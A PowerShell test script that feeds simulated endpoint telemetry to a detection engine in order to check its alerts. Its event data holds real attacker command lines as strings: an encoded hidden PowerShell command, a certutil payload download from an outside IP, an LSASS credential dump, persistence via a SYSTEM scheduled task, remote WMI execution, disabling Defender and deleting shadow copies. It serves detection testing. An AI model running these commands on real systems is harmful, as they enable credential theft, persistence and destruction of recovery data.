# ======================================================================
# security-framework - simulated sensor (PowerShell edition)
#
# Streams the exact same TTP scenario as the Go devsensor
# (cmd/devsensor/main.go) to the engine's NDJSON ingest port, but as a
# .ps1 script instead of a compiled exe. Reason: Windows Application
# Control / Smart App Control policies block unsigned binaries like
# bin\devsensor.exe, while powershell.exe is a signed system
# interpreter that those policies never block.
#
#   sf-devsensor                              (engine on 127.0.0.1:7777)
#   sf-devsensor -Addr 10.0.0.5:7777
#   sf-devsensor -IntervalMs 200
#
# Expected result on the engine terminal: 7 alerts (3 critical + 4 high)
# from 11 events (4 benign + 7 offensive). Works on PowerShell 5.1+.
# ======================================================================
param(
    [string]$Addr = '127.0.0.1:7777',
    [int]$IntervalMs = 400
)
$ErrorActionPreference = 'Stop'

$simHost = 'LAB-WKS-01'
$simUser = 'CORP\jdoe'

function New-SimEvent {
    param(
        [string]$Type,
        [hashtable]$Process,
        [hashtable]$Network,
        [switch]$Offensive
    )
    $ev = [ordered]@{
        id        = [Guid]::NewGuid().ToString()
        timestamp = (Get-Date).ToUniversalTime().ToString('o')
        type      = $Type
        source    = 'simulate'
        host      = $simHost
        user      = $simUser
    }
    if ($Process) { $ev['process'] = $Process }
    if ($Network) { $ev['network'] = $Network }
    if ($Offensive) { $ev['tags'] = @('ttp:offensive') }
    return $ev
}

function Get-SimDescription($ev) {
    if ($ev['process']) { return $ev['process']['name'] }
    if ($ev['network']) { return $ev['network']['domain'] }
    return '-'
}

# ---- scenario: must mirror cmd/devsensor/main.go ---------------------
$scenario = @(
    # benign baseline
    (New-SimEvent 'process.create' @{ pid = 4104; ppid = 812; name = 'explorer.exe'; image = 'C:\Windows\explorer.exe' }),
    (New-SimEvent 'process.create' @{ pid = 4212; ppid = 4104; name = 'notepad.exe'; command_line = '"C:\Windows\system32\NOTEPAD.EXE" C:\Users\jdoe\Documents\todo.txt'; image = 'C:\Windows\System32\notepad.exe' }),
    (New-SimEvent 'network.connect' $null @{ protocol = 'tcp'; source_ip = '10.0.4.42'; source_port = 51520; destination_ip = '142.250.200.36'; destination_port = 443; domain = 'www.google.com' }),
    # T1059.001 - PowerShell with encoded command (offensive)
    (New-SimEvent 'process.create' @{ pid = 6612; ppid = 4104; name = 'powershell.exe'; command_line = 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'; image = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' } $null -Offensive),
    # T1105 - certutil download (offensive)
    (New-SimEvent 'process.create' @{ pid = 6688; ppid = 4104; name = 'certutil.exe'; command_line = 'certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\Users\Public\payload.exe'; image = 'C:\Windows\System32\certutil.exe' } $null -Offensive),
    # T1003.001 - LSASS dump via comsvcs.dll (offensive)
    (New-SimEvent 'process.create' @{ pid = 6721; ppid = 6612; name = 'rundll32.exe'; command_line = 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full'; image = 'C:\Windows\System32\rundll32.exe' } $null -Offensive),
    # T1053.005 - scheduled task persistence (offensive)
    (New-SimEvent 'process.create' @{ pid = 6733; ppid = 6612; name = 'schtasks.exe'; command_line = 'schtasks.exe /create /tn "MicrosoftEdgeUpdaterCore" /sc onlogon /ru SYSTEM /tr "C:\Users\Public\payload.exe"'; image = 'C:\Windows\System32\schtasks.exe' } $null -Offensive),
    # T1047 - WMI process execution (offensive)
    (New-SimEvent 'process.create' @{ pid = 6744; ppid = 6612; name = 'wmic.exe'; command_line = 'wmic.exe /node:LAB-WKS-02 process call create "cmd.exe /c C:\Users\Public\payload.exe"'; image = 'C:\Windows\System32\wbem\WMIC.exe' } $null -Offensive),
    # T1562.001 - Defender tampering (offensive)
    (New-SimEvent 'process.create' @{ pid = 6755; ppid = 6612; name = 'powershell.exe'; command_line = 'powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true'; image = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' } $null -Offensive),
    # T1490 - inhibit recovery, VSS deletion (offensive)
    (New-SimEvent 'process.create' @{ pid = 6766; ppid = 6612; name = 'vssadmin.exe'; command_line = 'vssadmin.exe delete shadows /all /quiet'; image = 'C:\Windows\System32\vssadmin.exe' } $null -Offensive),
    # benign tail
    (New-SimEvent 'process.terminate' @{ pid = 4212; name = 'notepad.exe' })
)

# ---- resolve -Addr ----------------------------------------------------
$sep = $Addr.LastIndexOf(':')
if ($sep -lt 1) {
    Write-Host "[DEVSENSOR] invalid address '$Addr' (expected host:port)" -ForegroundColor Red
    exit 1
}
$ip = $Addr.Substring(0, $sep)
$port = 0
if (-not [int]::TryParse($Addr.Substring($sep + 1), [ref]$port)) {
    Write-Host "[DEVSENSOR] invalid port in '$Addr'" -ForegroundColor Red
    exit 1
}

# ---- connect ----------------------------------------------------------
$client = New-Object Net.Sockets.TcpClient
try {
    $client.Connect($ip, $port)
} catch {
    Write-Host "[DEVSENSOR] cannot reach engine at ${Addr}: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host '[DEVSENSOR] hint: start the engine first:  sf-engine   (or simply  sf-console)'
    exit 1
}

$stream = $client.GetStream()
$writer = New-Object IO.StreamWriter($stream, (New-Object Text.UTF8Encoding($false)))
$writer.NewLine = "`n"

Write-Host "[DEVSENSOR] connected to $Addr - streaming $($scenario.Count) events"
$i = 0
try {
    foreach ($ev in $scenario) {
        $i++
        $json = $ev | ConvertTo-Json -Compress -Depth 6
        $writer.WriteLine($json)
        $writer.Flush()
        $marker = 'benign'
        if ($ev['tags'] -contains 'ttp:offensive') { $marker = 'OFFENSIVE' }
        Write-Host ('[DEVSENSOR] {0,2}/{1} {2,-9} {3,-18} {4}' -f $i, $scenario.Count, $marker, $ev['type'], (Get-SimDescription $ev))
        if ($i -lt $scenario.Count) { Start-Sleep -Milliseconds $IntervalMs }
    }
} finally {
    $writer.Dispose()
    $client.Close()
}
Write-Host '[DEVSENSOR] scenario complete - connection closed'
